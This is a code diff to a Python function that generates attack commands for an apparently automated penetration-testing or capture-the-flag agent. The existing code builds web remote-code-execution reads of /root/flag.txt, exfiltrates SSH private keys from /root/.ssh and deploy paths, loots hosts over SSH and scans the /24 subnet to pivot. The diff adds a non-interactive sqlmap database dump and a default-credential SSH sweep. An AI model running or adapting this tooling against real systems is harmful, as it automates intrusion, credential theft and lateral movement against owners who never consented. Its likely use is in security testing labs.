@@ -101,7 +101,7 @@ def closer_commands(history: str, target: str) -> list[str]:
             r = f" --readme '{readme}'" if readme else ""
             cmds.append(f"ssh-loot --host {host} --key /tmp/loot/id_rsa{r}")
 
-    # Web foothold -> try both privesc closers + a direct read
+    # Web foothold -> try both privesc closers + a direct read + a SQLi dump
     fh = extract_web_foothold(h, target)
     if fh:
         u, p, meth, mode = fh["url"], fh["param"], fh["method"], fh["mode"]
@@ -110,9 +110,14 @@ def closer_commands(history: str, target: str) -> list[str]:
                     f"--flag /root/flag.txt")
         cmds.append(f"web-rce --url {u} --param {p} --method {meth} --mode {mode} "
                     f"--cmd 'cat /root/flag.txt'")
-        # PIVOT enabling: if we have a web foothold but no key yet, exfiltrate likely deploy/SSH keys
-        # through it (the extractor auto-persists them to /tmp/loot/id_rsa) and scan the /24 for the
-        # other host — so a second closer pass can ssh-loot. Makes the T6-style pivot deterministic.
+        # SQLi: deterministically test+dump the parameter with sqlmap (--batch = non-interactive).
+        # Dumped creds/hashes/flags are caught by the extractors; --threads for speed, capped risk.
+        _q = u if "?" in u else f"{u}?{p}=1"
+        _data = f" --data '{p}=1'" if meth == "POST" else ""
+        cmds.append(f"sqlmap -u '{_q}' -p {p}{_data} --batch --dump --flush-session "
+                    f"--level 2 --risk 1 --threads 4")
+        # PIVOT enabling: web foothold but no key yet -> exfiltrate likely deploy/SSH keys through it
+        # (extractor auto-persists to /tmp/loot/id_rsa) and scan the /24, so a 2nd pass can ssh-loot.
         if "begin openssh private key" not in low and "/tmp/loot/id_rsa" not in low:
             for kp in ("/opt/deploy/id_rsa", "/root/.ssh/id_rsa", "/home/*/.ssh/id_rsa",
                        "/opt/*/id_rsa", "/var/lib/*/.ssh/id_rsa"):
@@ -121,6 +126,10 @@ def closer_commands(history: str, target: str) -> list[str]:
             sub = _subnet24(target)
             if sub:
                 cmds.append(f"nmap -sn {sub}")
+
+    # Default-credential sweep when an SSH service is indicated (bounded, online-safe).
+    if "22/tcp" in low or "open ssh" in low or "ssh://" in low or "port 22" in low:
+        cmds.append(f"cred-sweep --target {target}")
     return cmds
 
 
